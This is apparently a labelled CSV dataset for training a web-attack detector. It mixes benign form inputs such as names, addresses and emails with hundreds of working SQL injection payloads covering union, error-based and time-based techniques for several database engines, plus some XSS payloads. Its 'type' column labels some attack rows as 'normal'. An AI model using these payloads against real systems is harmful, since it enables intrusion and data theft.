Text,attack_type,Label,type
"1')));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ((('ctbs' like 'ctbs",sqli,1,sql
47160,norm,0,normal
-5970' where 2769=2769 union all select 2769--,sqli,1,sql
"1'+(select 'zohk' where 5502=5502 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
"-2248'+(select wuow where 4421=4421 union all select 4421,4421,4421,4421,4421,4421--",sqli,1,sql
duthie,norm,0,normal
"1);select count(*) from generate_series(1,5000000)--",sqli,1,sql
sant pere de ribes,norm,0,normal
"c/ cabo lopez martinez s/n, 7?c",norm,0,normal
6505277758430555,norm,0,normal
cendreros,norm,0,normal
graupere trabucco,norm,0,normal
"carrer peru 128, 9?f",norm,0,normal
d5sm7lad7,norm,0,normal
"1 and make_set(9681=4703,4703)# zbrf",sqli,1,normal
carlina,norm,0,normal
grajera sampol,norm,0,normal
1') rlike (select (case when (9308=2540) then 1 else 0x28 end)) and ('rghd'='rghd,sqli,1,sql
1') as xskm where 3525=3525 and 2435=6513,sqli,1,normal
rocafort de queralt,norm,0,normal
"1"") as oijn where 1521=1521 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
marlow@botilleria.com.ec,norm,0,normal
15801,norm,0,normal
natver,norm,0,normal
"c/ de la riera d'horta 105, 5?h",norm,0,normal
"-7678))) union all select 2622,2622,2622,2622,2622,2622,2622,2622--",sqli,1,sql
calle aita barace 107,norm,0,normal
"1"")) as uels where 9447=9447 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",sqli,1,sql
ezio,norm,0,normal
vimbre,norm,0,normal
correa cachopo,norm,0,normal
1' where 3701=3701 and 2006=2006,sqli,1,normal
46128,norm,0,normal
mol,norm,0,normal
massimo,norm,0,normal
"-6597'+(select aewz where 4036=4036 union all select 4036,4036,4036,4036,4036,4036,4036--",sqli,1,sql
arraigadura,norm,0,normal
perpetuo,norm,0,normal
"1) as estm where 4809=4809 union all select null,null,null--",sqli,1,sql
lizzi,norm,0,normal
"1%"") and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""%""=""",sqli,1,sql
wester0,norm,0,normal
"-5698')) as egjr where 5586=5586 union all select 5586,5586,5586--",sqli,1,sql
"-2085"") as hkev where 7730=7730 union all select 7730,7730--",sqli,1,sql
liotard_rudhyar@zarasalud.gi,norm,0,normal
"-7941%') union all select 6965,6965,6965,6965--",sqli,1,sql
mebine,norm,0,normal
"1'));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (('btnl'='btnl",sqli,1,sql
17085407h,norm,0,normal
"1) as keog where 8033=8033 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",sqli,1,sql
cortadellas@ppmanzanares.cx,norm,0,normal
terrs triola,norm,0,normal
"1%');select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
6721,norm,0,normal
bainton3,norm,0,normal
'></select><script>alert(xss)</script>,xss,2,xss
"1%"" (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ""%""=""",sqli,1,sql
transito de entrerruas 146 1-e,norm,0,normal
baumgarten bagudanc,norm,0,normal
alimena,norm,0,normal
"1%') union all select null,null,null,null,null,null#",sqli,1,sql
1')) and (7517=3423)*3423 and (('aenz'='aenz,sqli,1,normal
patacki,norm,0,normal
22011041h,norm,0,normal
kenji,norm,0,normal
1) rlike (select (case when (7689=7689) then 1 else 0x28 end)),sqli,1,sql
1))) union all select null#,sqli,1,sql
villamuera de la cueza,norm,0,normal
andruzzi,norm,0,normal
"1'))) union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
"carrer carrasca 19, 4-c",norm,0,normal
genny,norm,0,normal
"calle arfian 36,",norm,0,normal
marsdon@hrmsl.cn,norm,0,normal
11295198j,norm,0,normal
1%');select (case when (5740=7636) then 5740 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
-6792)) as zlho where 4758=4758 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,sqli,1,sql
stange,norm,0,normal
bernadita,norm,0,normal
"rio nervion, 177",norm,0,normal
atalaya,norm,0,normal
contradicha,norm,0,normal
"<img id=xss src=`javascript:alert(""'xss'"")`>",xss,2,xss
ba94aridad,norm,0,normal
"-6125'||(select 'hwnm' where 1428=1428 union all select 1428,1428,1428,1428,1428,1428#",sqli,1,sql
tamer,norm,0,normal
f8rol5ra,norm,0,normal
"1"") where 5814=5814 and 6969=(select 6969 from pg_sleep(5))--",sqli,1,sql
"1"") as qayu where 6222=6222 union all select null,null,null#",sqli,1,sql
cntrico,norm,0,normal
barrenechea sadurn,norm,0,normal
"-1269"" union all select 8412,8412,8412,8412,8412,8412,8412,8412--",sqli,1,sql
alidia,norm,0,normal
"-1550' in boolean mode) union all select 9777,9777,9777--",sqli,1,sql
"1%')) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
sabathiel,norm,0,normal
pr99o9a9,norm,0,normal
mullinar_lemanska@gallegonicolas.ps,norm,0,normal
"palomares, 2 11b",norm,0,normal
"1"" procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)",sqli,1,sql
cartes,norm,0,normal
7133903529620631,norm,0,normal
"1' in boolean mode) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)#",sqli,1,sql
2001127126954456,norm,0,normal
"-6158""))) or 8571=8571--",sqli,1,sql
"-6170))) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
"1%' or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and '%'='",sqli,1,normal
25742430w,norm,0,normal
francisk,norm,0,normal
8363,norm,0,normal
4396,norm,0,normal
alden@b-sign.sv,norm,0,normal
1));if(7899=7899) select 7899 else drop function zbbp--,sqli,1,sql
destete,norm,0,normal
5098258460749726,norm,0,normal
vachiran,norm,0,normal
"1'))) and make_set(9514=8668,8668) and ((('sgjj' like 'sgjj",sqli,1,normal
zelada,norm,0,normal
-9355' or 6872=6872 and 'mztk'='mztk,sqli,1,normal
"calle profeta, 96, 2?c",norm,0,normal
"1'||(select 'zvpl' where 5877=5877 union all select null,null#",sqli,1,sql
1;select case when 7717=7717 then 1 else null end--,sqli,1,sql
"<img src="" javascript:alert('crosssitescripting');"">",xss,2,xss
mccollon@irmedia.ca,norm,0,normal
orce,norm,0,normal
39654869v,norm,0,normal
1'+(select 'yyyn' where 5395=5395;select (case when (8663=7467) then 8663 else 1/(select 0) end)--,sqli,1,sql
02649,norm,0,normal
8otijo,norm,0,normal
marion,norm,0,normal
"regimiento, 114,",norm,0,normal
flury,norm,0,normal
4909,norm,0,normal
lubin,norm,0,normal
"1"") union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
gilito,norm,0,normal
"1"" order by 1--",sqli,1,sql
-1219') or 5592=4835,sqli,1,normal
"-7382')) or make_set(9425=4330,4330) and (('tvaz' like 'tvaz",sqli,1,normal
"1) union all select null,null,null,null,null,null,null--",sqli,1,sql
"gravina, 78",norm,0,normal
1')) as yefv where 4263=4263;waitfor delay '0:0:5'--,sqli,1,sql
ate7t3r,norm,0,normal
jocs olimpics 110 1-b,norm,0,normal
avinguda de la reina maria cristina 174 2?b,norm,0,normal
48263928s,norm,0,normal
46940,norm,0,normal
24248,norm,0,normal
"-3505"") where 2340=2340 or 9323=9323#",sqli,1,normal
"1"")));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (((""yzjl"" like ""yzjl",sqli,1,sql
famery@noticiasenvivo.ie,norm,0,normal
56163821y,norm,0,normal
"1');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('ckpm'='ckpm",sqli,1,sql
8019,norm,0,normal
belanger,norm,0,normal
tagamanent,norm,0,normal
duornik-gracia@zeat.pt,norm,0,normal
571,norm,0,normal
"1) where 9724=9724 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",sqli,1,sql
djjatshkov@laspruebascongaseosa.qa,norm,0,normal
44159,norm,0,normal
"1 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)# zwck",sqli,1,sql
esculpidura,norm,0,normal
ania,norm,0,normal
"1""))) and (select * from (select(sleep(5)))gcrr)#",sqli,1,sql
81568460h,norm,0,normal
"1"");if(7899=7899) select 7899 else drop function zbbp--",sqli,1,sql
se0am536e,norm,0,normal
78901606z,norm,0,normal
73672811q,norm,0,normal
37759460s,norm,0,normal
mayola laparra,norm,0,normal
pugliesi boleda,norm,0,normal
amoeiro,norm,0,normal
1'+(select 'jtvq' where 8288=8288 and (select * from (select(sleep(5)))gcrr)#,sqli,1,sql
jolley@decoaching.na,norm,0,normal
pasadizo fernandez 92 3-c,norm,0,normal
aisha,norm,0,normal
"1"") and make_set(8403=8403,8899) and (""dhss""=""dhss",sqli,1,normal
"1') or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('maln' like 'maln",sqli,1,normal
-3044') or 4999=3051#,sqli,1,normal
1);begin user_lock.sleep(5); end,sqli,1,sql
chlud_kumvongse@encuentrodominios.sd,norm,0,normal
"1%"" and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ""%""=""",sqli,1,sql
37254,norm,0,normal
"1' and make_set(9860=6956,6956) and 'toru'='toru",sqli,1,normal
pacon,norm,0,normal
45295566x,norm,0,normal
44491,norm,0,normal
1) where 5866=5866 and 4595=4595#,sqli,1,normal
aadir al carrito,norm,0,normal
"1%""))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (((""%""=""",sqli,1,sql
"1) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (4976=4976",sqli,1,sql
aranga,norm,0,normal
teodosia,norm,0,normal
"1) or 8466=benchmark(5000000,md5(0x694a4745)) and (1773=1773",sqli,1,normal
12noc567me2te,norm,0,normal
1' in boolean mode) and 7533=7533#,sqli,1,normal
dungan,norm,0,normal
"1'+(select sged where 1181=1181 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))+'",sqli,1,sql
3836034601398143,norm,0,normal
veracruz,norm,0,normal
-4055')) as yoez where 3816=3816 or (8459=8459)*4906--,sqli,1,sql
6258,norm,0,normal
"1'||(select 'jzwq' where 3289=3289 union all select null,null,null,null,null,null,null#",sqli,1,sql
cuarentona,norm,0,normal
montiel@sitienesunawebtienesunnegocio.cf,norm,0,normal
thum,norm,0,normal
1;(select * from (select(sleep(5)))srmq),sqli,1,sql
"1%"")) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ((""%""=""",sqli,1,sql
"-1174"" union all select 4303,4303,4303,4303#",sqli,1,sql
aguzadera,norm,0,normal
"1 where 4519=4519;iif(5257=5257,1,1/0)",sqli,1,sql
kouraviev@socimi.com.gl,norm,0,normal
1%');select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,1,sql
-7552 or 6872=6872,sqli,1,normal
6617433173980708,norm,0,normal
2857564208258288,norm,0,normal
chuang,norm,0,normal
"-5379') union all select 4294,4294,4294--",sqli,1,sql
"1'||(select 'pzoe' where 2977=2977 and elt(3114=3114,sleep(5))#",sqli,1,sql
69557398q,norm,0,normal
cosmlogo,norm,0,normal
blgico,norm,0,normal
ar52eti67,norm,0,normal
0381931472623301,norm,0,normal
"-8841%"") or 4361=1910",sqli,1,normal
"av. benisa 43, 10d",norm,0,normal
69309273s,norm,0,normal
"1"" or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ""gknn"" like ""gknn",sqli,1,sql
"1)) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((9270=9270",sqli,1,sql
"<style>body{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</style>",xss,2,normal
"1%"") and sleep(5) and (""%""=""",sqli,1,normal
piel,norm,0,normal
73034797e,norm,0,normal
prestrud,norm,0,normal
87853992h,norm,0,normal
"1) or 8421=(select count(*) from generate_series(1,5000000))",sqli,1,sql
1' and sleep(5),sqli,1,normal
0824507714934281,norm,0,normal
morosa,norm,0,normal
"1"" where 7631=7631 and 4733=3439",sqli,1,normal
bidart-halton@monnal.tel,norm,0,normal
-7772')) or 9323=9323#,sqli,1,normal
benfield@chuecafamily.gs,norm,0,normal
tiru corominas,norm,0,normal
"1' where 8277=8277 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",sqli,1,sql
"1""))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"1"") where 5828=5828 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
arturo,norm,0,normal
"1"")) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
10200,norm,0,normal
de jaime,norm,0,normal
levi@coivoco.gr,norm,0,normal
1')) and sleep(5)#,sqli,1,normal
sol sieso,norm,0,normal
68252027x,norm,0,normal
terl6z,norm,0,normal
45810,norm,0,normal
"1 where 1776=1776 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
1'+(select wpkh where 5842=5842;select sleep(5))+',sqli,1,sql
kriz,norm,0,normal
demoniaca,norm,0,normal
"1%'))) union all select null,null,null,null,null--",sqli,1,sql
"1,(select (case when (2970=5830) then 1 else 2970*(select 2970 from mysql.db) end))",sqli,1,sql
belarmina,norm,0,normal
7254612789884855,norm,0,normal
yoshiyam,norm,0,normal
azuqueca de henares,norm,0,normal
chasse,norm,0,normal
virchick1,norm,0,normal
trimble.scelzo@todomodelos.al,norm,0,normal
33418,norm,0,normal
1'));select case when 2095=9074 then 1 else null end--,sqli,1,sql
humaina,norm,0,normal
1) as afmb where 8665=8665 order by 1#,sqli,1,normal
"1' where 9381=9381;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",sqli,1,sql
c/ florida 162 1-f,norm,0,normal
18410,norm,0,normal
cadek,norm,0,normal
aghili,norm,0,normal
"1')) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (('pbtf'='pbtf",sqli,1,sql
levert,norm,0,normal
alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>,xss,2,normal
"1'||(select 'fqoz' where 9794=9794 union all select null,null,null,null,null--",sqli,1,sql
maracaja@telogis.ad,norm,0,normal
tolondro,norm,0,normal
"1')) as uizu where 1774=1774;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",sqli,1,sql
"varadero 68, 8-c",norm,0,normal
metrics,norm,0,normal
"1"") where 8612=8612;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
1 where 1568=1568 or (select * from (select(sleep(5)))sddo)#,sqli,1,sql
donath@tgcprint.eg,norm,0,normal
"ferrer del rio, 126 2?h",norm,0,normal
8320919959502275,norm,0,normal
"1"" procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)",sqli,1,normal
"calle garci-perez 41, 9?c",norm,0,normal
fontanar,norm,0,normal
freydig rueda,norm,0,normal
1');begin dbms_lock.sleep(5); end and ('jzlr'='jzlr,sqli,1,sql
"1) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)",sqli,1,sql
amelie,norm,0,normal
"-5516'+(select 'bmlv' where 7188=7188 union all select 7188,7188,7188,7188,7188,7188,7188,7188#",sqli,1,sql
e0u08os1,norm,0,normal
7225214328670824,norm,0,normal
1' in boolean mode) order by 1--,sqli,1,sql
"1"") and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (""hybu"" like ""hybu",sqli,1,sql
pegler,norm,0,normal
moldurar,norm,0,normal
dorice,norm,0,normal
5e3i2a4,norm,0,normal
"1%'));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (('%'='",sqli,1,sql
"1';select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",sqli,1,sql
enjergado,norm,0,normal
61089610t,norm,0,normal
02295767e,norm,0,normal
byoung,norm,0,normal
"c/ virgen de la paloma, 107",norm,0,normal
"1) where 8164=8164 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
55658066k,norm,0,normal
32358,norm,0,normal
"-5193 where 2175=2175 union all select 2175,2175,2175,2175,2175,2175,2175,2175,2175,2175#",sqli,1,sql
"1) as odqn where 3910=3910;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
1 where 9361=9361 and 7478=9170--,sqli,1,sql
"1');create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
"1"")) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
34870,norm,0,normal
4734,norm,0,normal
orientalista,norm,0,normal
"c/ san cristobal, s/n",norm,0,normal
ech5d7,norm,0,normal
"1"") as zuzm where 1211=1211 and elt(5458=2966,2966)--",sqli,1,sql
"1')) as namw where 1740=1740 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",sqli,1,sql
"1))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((8738=8738",sqli,1,sql
valdovio,norm,0,normal
pea barnera,norm,0,normal
1)));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1,sql
necforo,norm,0,normal
"1')) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
-2920')) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('rzey'='rzey,sqli,1,sql
hinkel,norm,0,normal
2262,norm,0,normal
koopenhoeffer@paremoselalzheimer.im,norm,0,normal
nalbach0@softwaremasservicio.aero,norm,0,normal
servitje areggiani,norm,0,normal
"1') and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('qtfl'='qtfl",sqli,1,sql
"-7544"")) union all select 3808,3808,3808,3808--",sqli,1,sql
sonne,norm,0,normal
"1"")) as esho where 8864=8864 order by 1--",sqli,1,sql
"1' where 8128=8128;select * from generate_series(2317,2317,case when (2317=9706) then 1 else 0 end) limit 1--",sqli,1,sql
"1"";begin dbms_lock.sleep(5); end and ""xouo"" like ""xouo",sqli,1,sql
"plaa gabriela mistral, 140",norm,0,normal
pernign,norm,0,normal
"-4772))) union all select 3879,3879,3879,3879,3879--",sqli,1,sql
ozmond-woolgar@adscrito.tj,norm,0,normal
yecla,norm,0,normal
1 or 6793=(select 6793 from pg_sleep(5)),sqli,1,sql
"-1339))) union all select 2938,2938,2938,2938,2938,2938#",sqli,1,sql
"1"")) as chal where 6661=6661;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
pascualino,norm,0,normal
"1%"")) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((""%""=""",sqli,1,sql
"-7806"")) or (8459=8459)*4906 and ((""vlrj"" like ""vlrj",sqli,1,normal
thalasso.chappell@titulosoficiales.jp,norm,0,normal
19311,norm,0,normal
7400285622819954,norm,0,normal
jovn,norm,0,normal
"-8875"") where 8428=8428 or 1519=5756--",sqli,1,sql
23752403g,norm,0,normal
88360528w,norm,0,normal
0210374082544732,norm,0,normal
"1%"");begin user_lock.sleep(5); end--",sqli,1,sql
45240,norm,0,normal
a75isi6i7id1d,norm,0,normal
rillo de gallo,norm,0,normal
vera,norm,0,normal
chrysa2,norm,0,normal
landolfi ribas,norm,0,normal
"<style>li {list-style-image: url(""javascript:document.cookie=true;"");</style><ul><li>crosssitescripting",xss,2,xss
38980059g,norm,0,normal
alarba,norm,0,normal
6460,norm,0,normal
"1"" where 7245=7245 and 9198=9198--",sqli,1,sql
taghizad,norm,0,normal
40531,norm,0,normal
"-4408"") or 6872=6872 and (""oenu""=""oenu",sqli,1,normal
sherm,norm,0,normal
pins turrubiartes,norm,0,normal
"-2110' or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
kariann,norm,0,normal
3oque70,norm,0,normal
62128531b,norm,0,normal
"1%') and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ('%'='",sqli,1,sql
8888494677705913,norm,0,normal
10940,norm,0,normal
winifred5,norm,0,normal
snedeker,norm,0,normal
3226,norm,0,normal
quill,norm,0,normal
"1) as kzyb where 7023=7023 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"calle isis, 180",norm,0,normal
"1'||(select 'eamo' where 4958=4958 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5))||'",sqli,1,sql
01067171v,norm,0,normal
codos,norm,0,normal
"baltarga, s/n",norm,0,normal
kurian,norm,0,normal
"1"")));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
redecilla del campo,norm,0,normal
"1%"" rlike (select * from (select(sleep(5)))vwyq)#",sqli,1,sql
"1"") where 9962=9962 and 4595=4595#",sqli,1,normal
cabieces amayuela,norm,0,normal
75013152d,norm,0,normal
"1' where 2964=2964 union all select null,null,null#",sqli,1,sql
"-6580') union all select 9950,9950,9950,9950,9950,9950--",sqli,1,sql
melliza,norm,0,normal
kiyohara,norm,0,normal
1 rlike sleep(5)# urxh,sqli,1,normal
"1%"")) and 9198=9198--",sqli,1,sql
"1)) as jyfo where 8121=8121 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
clara,norm,0,normal
"1"") as fkgs where 5948=5948 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
karchevs,norm,0,normal
begard.o,norm,0,normal
1102,norm,0,normal
85533864s,norm,0,normal
"1"") as yzzk where 1813=1813 and (3020=3020)*6703--",sqli,1,sql
-5852) as anca where 3574=3574 or 3958=5536#,sqli,1,normal
"-9638))) or elt(1032=1032,3623) and (((3679=3679",sqli,1,normal
46194,norm,0,normal
raynor,norm,0,normal
"1"" where 1831=1831 and (select * from (select(sleep(5)))gcrr)#",sqli,1,sql
"guardia, la",norm,0,normal
"1%"") or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""%""=""",sqli,1,normal
francisco jorquera s/n 1?d,norm,0,normal
"-1<input type=""image"" src=""javascript:document.cookie=true;"">",xss,2,xss
72ic5oid4,norm,0,normal
"pobra do caramial, a",norm,0,normal
5010625688274863,norm,0,normal
b129a97r,norm,0,normal
pious-muszte9@prestigecars.sg,norm,0,normal
"1%' union all select null,null,null,null#",sqli,1,sql
nadav6,norm,0,normal
24244793x,norm,0,normal
"1' and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
7636792275869092,norm,0,normal
9828908323300958,norm,0,normal
thorpe,norm,0,normal
"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",sqli,1,sql
"c/ galicia, 180,",norm,0,normal
1' and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and 'foju'='foju,sqli,1,sql
-9556') where 2472=2472 or (2883=9968)*9968--,sqli,1,sql
9639622169891672,norm,0,normal
sterland@zingtonos.vg,norm,0,normal
45788067n,norm,0,normal
"urbanizacion ciudad residencial universitaria 58, 8?c",norm,0,normal
"1) where 5096=5096 and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
"-1639)) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((3318=3318",sqli,1,sql
766,norm,0,normal
cooperma,norm,0,normal
omen@meneamex.sh,norm,0,normal
"1"") where 3390=3390;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",sqli,1,sql
"-1791' union all select 9316,9316,9316,9316,9316,9316,9316,9316--",sqli,1,sql
"1"") waitfor delay '0:0:5' and (""hhzy"" like ""hhzy",sqli,1,normal
1') and 1987=3756#,sqli,1,normal
orgilles guilbauth,norm,0,normal
torreblascopedro,norm,0,normal
cardona@interanuncios.mv,norm,0,normal
"c/ ferriol, 105 11?d",norm,0,normal
"1))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((7589=7589",sqli,1,sql
3118403401340086,norm,0,normal
9789,norm,0,normal
bonjorn padura,norm,0,normal
acampo,norm,0,normal
oretana,norm,0,normal
-2817%') or 8255=3841--,sqli,1,sql
"1%');select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
10560589r,norm,0,normal
c/ duquesa de castrejon s/n 12g,norm,0,normal
08071780e,norm,0,normal
quality,norm,0,normal
montferri,norm,0,normal
"cuesta sagrado corazon, 155 5?a",norm,0,normal
26223,norm,0,normal
16601924h,norm,0,normal
"-9227) where 6723=6723 union all select 6723,6723,6723,6723,6723,6723,6723,6723,6723,6723--",sqli,1,sql
-3297' or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))),sqli,1,sql
"1') or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",sqli,1,sql
ja3aln,norm,0,normal
oda,norm,0,normal
